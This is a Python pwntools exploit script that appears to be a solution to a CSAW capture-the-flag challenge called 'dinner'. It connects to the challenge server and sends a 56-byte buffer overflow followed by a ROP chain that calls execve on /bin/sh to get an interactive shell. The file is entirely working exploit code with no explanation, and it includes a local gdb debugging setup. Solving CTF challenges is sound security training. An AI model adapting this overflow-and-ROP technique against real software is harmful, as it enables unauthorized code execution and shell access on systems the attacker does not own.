#!/usr/bin/env python

from pwn import *

local = 0
preload = 1

if local:
	if preload:
		env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
		r = process("./dinner", env=env)
		log.info("Libc has been preloaded!")
	else:
		r = process("./dinner")
	gdb.attach(r, '''
		set disable-randomization off
		b *0x4005fe
		c
		''')
else:
	r = remote("pwn.chal.csaw.io", 10104)

POP_RAX = 0x4005cf
POP_RDX = 0x4005c6
POP_RSI = 0x4005bd
POP_RDI = 0x4005b4
SYSCALL = 0x4005aa
BIN_SH = 0x400698

print r.recvuntil("(:")

payload = ''
payload += 'A'*56
payload += p64(POP_RDX)
payload += p64(0x0)
payload += p64(POP_RSI)
payload += p64(0x0)
payload += p64(POP_RDI)
payload += p64(BIN_SH)
payload += p64(POP_RAX)
payload += p64(59)
payload += p64(SYSCALL)

r.sendline(payload)

r.interactive()
